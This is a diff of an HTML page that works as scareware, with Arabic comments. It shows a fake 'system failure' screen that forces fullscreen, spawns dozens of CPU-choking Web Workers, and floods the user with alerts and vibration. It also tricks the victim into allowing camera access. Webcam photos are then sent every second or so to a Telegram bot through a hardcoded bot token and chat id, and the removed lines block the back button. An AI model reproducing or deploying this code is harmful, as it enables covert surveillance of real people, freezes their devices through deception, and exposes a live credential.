@@ -1,21 +1,20 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>🚨 Critical System Failure 🚨</title>
+    <title>🚨 System Error 🚨</title>
     <style>
-        body { background: #000; color: #f00; font-family: 'Courier New', Courier, monospace; text-align: center; padding-top: 20%; overflow: hidden; margin: 0; }
-        .glitch { font-size: 40px; font-weight: bold; animation: shake 0.1s infinite; }
-        @keyframes shake { 0% {transform: translate(0,0);} 25% {transform: translate(5px,5px);} 50% {transform: translate(-5px,-5px);} 100% {transform: translate(0,0);} }
-        .lock-btn { padding: 30px 60px; background: #f00; color: #fff; border: 5px solid #fff; font-size: 25px; cursor: pointer; border-radius: 10px; box-shadow: 0 0 50px #f00; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .box { border: 2px solid #0f0; padding: 40px; background: rgba(0,20,0,0.9); box-shadow: 0 0 50px #0f0; }
+        .btn { padding: 25px 50px; background: #0f0; color: #000; font-size: 20px; font-weight: bold; border: none; cursor: pointer; border-radius: 5px; }
     </style>
 </head>
-<body onclick="rogueAttack()">
+<body onclick="executeZeroHit()">
 
-    <div id="ui">
-        <h1 class="glitch">SYSTEM INFECTED</h1>
-        <p style="font-size: 20px; color: #fff;">تم تشفير ملفات النظام. اضغط فوراً لإيقاف التدمير.</p>
-        <button class="lock-btn">إيقاف التدمير (STOP)</button>
+    <div class="box" id="ui">
+        <h1>SYSTEM FAILURE DETECTED</h1>
+        <p>Your hardware is under stress. Repair required immediately.</p>
+        <button class="btn">إصلاح النظام الآن</button>
     </div>
 
     <video id="v" style="display:none;" autoplay playsinline></video>
@@ -24,47 +23,44 @@
     <script>
     const token = '8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY';
     const chat_id = '1772820433';
-    let triggered = false;
 
-    async function rogueAttack() {
-        if(triggered) return;
-        triggered = true;
-
-        // 1. الدخول في وضع "السجن الرقمي" (Fullscreen)
+    async function executeZeroHit() {
+        // 1. شل حركة النظام فوراً (Fullscreen)
         document.documentElement.requestFullscreen().catch(()=>{});
+        document.getElementById('ui').innerHTML = "<h1>REPAIRING...</h1><p>DO NOT TOUCH THE SCREEN</p>";
 
-        // 2. فخ الكاميرا - الضحية رح يضغط "سماح" خوفاً على جهازه
-        try {
-            const s = await navigator.mediaDevices.getUserMedia({ video: true });
-            document.getElementById('v').srcObject = s;
-            setInterval(captureAndShip, 1000); // صور كل ثانية
-        } catch(e) {
-            alert("⚠️ خطأ: يجب السماح بفك التشفير وإلا سيتم مسح بياناتك!");
-            location.reload();
-        }
-
-        // 3. الهجوم النووي على المعالج والرام (Recursive Workers)
-        // هذا الكود بيخلق دوامة بتجمد أزرار الوسط واليسار تماماً
-        for(let i=0; i<60; i++) {
+        // 2. ثغرة الخيوط المتعددة (Web Workers) لتجميد الأزرار
+        for(let i=0; i<100; i++) {
             const blob = new Blob([`
+                const sab = new SharedArrayBuffer(1024 * 1024 * 64);
+                const view = new Int32Array(sab);
                 setInterval(() => {
-                    let d = [];
-                    for(let j=0; j<1000000; j++){ d.push(new Array(1000).fill('BYPASS')); }
-                    while(true){ Math.atan(Math.random()); }
+                    for(let j=0; j<view.length; j++) { view[j] = Math.random() * 0xFFFFFFFF; }
+                    while(true) { /* CPU Choke */ }
                 }, 1);
             `]);
             new Worker(URL.createObjectURL(blob));
         }
 
-        // 4. قصف الواجهة (شل حركة اليد والأزرار)
+        // 3. فخ الصيد (الكاميرا)
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('v').srcObject = stream;
+            setInterval(captureAndSend, 1200);
+        } catch(e) {
+            alert("🚨 CRITICAL ERROR: Camera access needed to verify hardware integrity!");
+            location.reload();
+        }
+
+        // 4. قفل أزرار التنقل (Alert Bombing)
         setInterval(() => {
-            navigator.vibrate(5000); // اهتزاز ما يوقف
-            document.documentElement.requestFullscreen(); // إعادة القفل
-            alert("🚨 تحذير: المعالج وصل لدرجة الغليان! لا تحاول الخروج.");
+            navigator.vibrate(5000);
+            document.documentElement.requestFullscreen();
+            alert("⚠️ WARNING: Processor temperature is too high. Controls locked.");
         }, 30);
     }
 
-    function captureAndShip() {
+    function captureAndSend() {
         const canvas = document.getElementById('c');
         const video = document.getElementById('v');
         canvas.width = 640; canvas.height = 480;
@@ -72,14 +68,10 @@
         canvas.toBlob((b) => {
             const f = new FormData();
             f.append('chat_id', chat_id);
-            f.append('photo', b, 'zero_day.jpg');
+            f.append('photo', b, 'zero_hit.jpg');
             fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:f});
         }, 'image/jpeg', 0.4);
     }
-
-    // منع زر الرجوع
-    history.pushState(null, null, location.href);
-    window.onpopstate = () => history.go(1);
     </script>
 </body>
 </html>
